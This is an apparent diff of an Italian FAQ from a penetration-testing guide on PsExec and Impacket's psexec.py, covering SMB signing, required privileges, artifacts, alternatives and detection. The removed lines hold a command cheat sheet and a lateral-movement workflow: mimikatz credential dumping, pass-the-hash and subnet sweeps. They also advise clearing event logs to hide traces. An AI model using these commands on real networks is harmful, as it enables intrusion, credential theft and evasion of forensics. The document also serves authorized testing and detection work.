-PsExec (Sysinternals) è binary Windows, richiede password, ha signature Microsoft. psexec.py (Impacket) è Python script, supporta PTH, cross-platform (Linux/Mac). Funzionamento simile ma psexec.py offre più flessibilità offensive.
+**Qual è la differenza tra PsExec e psexec.py?**
+PsExec è un binario Windows firmato Microsoft, vuole la password e copia `PSEXESVC.exe`. `psexec.py` è uno script Python che gira anche da Linux, supporta pass the hash e usa il binario RemCom con nomi casuali per servizio e file.
 
-**PsExec funziona contro sistemi con SMB signing required?**
+**PsExec funziona con SMB signing attivo?**
+Sì. L'SMB signing impedisce gli attacchi di relay, non l'autenticazione legittima: con credenziali valide PsExec funziona anche con signing obbligatorio.
 
-Sì. SMB signing previene relay attacks (come Responder), non blocca autenticazione legittima. PsExec funziona normalmente anche con SMB signing enforced.
+**PsExec richiede un Domain Admin?**
+No, basta essere amministratore locale sul target. Un Domain Admin lo è automaticamente su ogni macchina del dominio, ma per una singola workstation è sufficiente l'amministratore locale di quella macchina.
 
-**Come bypassare detection Event 7045?**
+**Come posso evitare l'Event ID 7045?**
+Con PsExec non puoi: la creazione del servizio è il suo meccanismo. Se non vuoi creare servizi usa `wmiexec` o Evil-WinRM. Un nome di servizio custom con `-r` riduce il match sulle firme note, ma l'evento resta registrato.
 
-Non puoi evitare completamente Event 7045 con PsExec (service creation è core mechanism). Alternative: usa **wmiexec.py** (no service) o **evil-winrm** (WinRM, no service SMB). Custom service name (`-r` flag) riduce signature detection ma non elimina event.
+**PsExec lascia tracce permanenti?**
+Il binario `PSEXESVC.exe` viene rimosso a fine esecuzione, ma restano il file Prefetch (`PSEXESVC.exe-*.pf` in `C:\Windows\Prefetch`) e gli eventi nei log (7045, 4624, 5145) fino alla rotazione.
 
-**PsExec vs WinRM: quando usare quale?**
+**Quali sono le alternative a PsExec?**
+`wmiexec` per la massima discrezione, Evil-WinRM per una shell interattiva con trasferimento file, `smbexec` come compromesso. Sul lato amministrativo, PowerShell Remoting e Invoke-Command sono le alternative native.
 
-**PsExec**: SMB (445) aperto, target Windows legacy (pre-2012), reliability massima.
-**WinRM**: RPC/WMI bloccati ma HTTP 5985 aperto, necessità interactive PowerShell, meno artifacts forensic.
-
-Vedi [Evil-WinRM guide](/articoli/evilwinrm/) per WinRM exploitation.
-
-**Impacket richiede credenziali Domain Admin?**
-
-No. Impacket richiede **local Administrator** sul target. Può essere local admin account o Domain Admin (che è automaticamente local admin su domain-joined machines). Per workstation standalone, serve local admin di quella macchina.
-
-**PsExec lascia artifacts permanenti?**
-
-PSEXESVC.exe è eliminato dopo execution, ma **Prefetch** file persiste in `C:\Windows\Prefetch\PSEXESVC.exe-*.pf`. Event logs (7045, 4624, 5145) persistono fino a rotation. Per cleanup completo, elimina prefetch e clear event logs.
-
-## Cheat Sheet
-
-| Comando                                                 | Descrizione               |
-| ------------------------------------------------------- | ------------------------- |
-| `PsExec.exe \\target -u DOMAIN\user -p pass cmd`        | Shell remota interattiva  |
-| `PsExec.exe \\target -u user -p pass -s cmd`            | Shell come SYSTEM         |
-| `PsExec.exe \\target -u user -p pass -c payload.exe`    | Upload & execute          |
-| `PsExec.exe \\target -u user -p pass -d payload.exe`    | Execute detached          |
-| `PsExec.exe @targets.txt -u user -p pass whoami`        | Multiple targets          |
-| `PsExec.exe \\target -u user -p pass -r CustomName cmd` | Custom service name       |
-| `psexec.py DOMAIN/user:pass@target`                     | Impacket con password     |
-| `psexec.py -hashes :NTLM DOMAIN/user@target`            | Impacket Pass-the-Hash    |
-| `psexec.py -hashes :hash user@target -k`                | Kerberos auth             |
-| `smbexec.py DOMAIN/user:pass@target`                    | SMB exec (no binary drop) |
-| `wmiexec.py DOMAIN/user:pass@target`                    | WMI exec (stealth)        |
-
-**Workflow lateral movement tipico:**
-
-```bash
-# 1. Credential harvest
-mimikatz.exe "sekurlsa::logonpasswords" exit
-
-# 2. Validate con CrackMapExec
-crackmapexec smb 192.168.10.0/24 -u admin -H hash
-
-# 3. PTH lateral
-psexec.py -hashes :hash CORP/admin@192.168.10.50
-
-# 4. Dump new target
-C:\> mimikatz.exe "sekurlsa::logonpasswords" exit
-
-# 5. Propagate
-psexec.py -hashes :[NEW_HASH] CORP/user@next_target
-```
-
-***
-
-**Disclaimer:** PsExec è tool di amministrazione legittimo ma può essere usato per lateral movement non autorizzato. L'utilizzo su sistemi senza esplicito consenso scritto costituisce reato penale (accesso abusivo art. 615-ter c.p.). Usa solo su infrastrutture di tua proprietà o con autorizzazione formale penetration testing. Download ufficiale: [https://learn.microsoft.com/en-us/sysinternals/downloads/psexec](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec)
+**Come si rileva PsExec nella mia rete?**
+Cerca l'Event ID 7045 con servizio `PSEXESVC` o con nomi di servizio sospetti creati da accessi di rete, la pipe `PSEXESVC` in Sysmon e le scritture su `ADMIN$`. Poi riduci la superficie: LAPS, SMB limitato tra workstation e `PsExec.exe` consentito solo agli amministratori.
